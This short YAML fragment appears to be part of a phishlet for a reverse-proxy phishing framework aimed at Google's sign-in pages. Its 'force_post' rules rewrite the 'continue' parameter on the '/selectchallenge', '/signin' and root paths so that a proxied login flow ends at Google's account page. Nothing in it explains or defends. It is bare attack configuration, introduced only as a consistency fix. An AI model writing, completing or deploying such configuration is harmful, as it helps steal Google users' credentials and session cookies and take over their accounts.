# Corrected forced POST redirection for consistency
force_post:
  - path: "/selectchallenge"
    search:
      - { key: "flowEntry", search: ".*" }
    force:
      - { key: "continue", value: "https://myaccount.google.com" }
    type: "post"
  - path: "/signin"
    search:
      - { key: "flowEntry", search: ".*" }
    force:
      - { key: "continue", value: "https://myaccount.google.com" }
    type: "post"
  - path: "/"
    search:
      - { key: "flowEntry", search: ".*" }
    force:
      - { key: "continue", value: "https://myaccount.google.com" }
    type: "post"

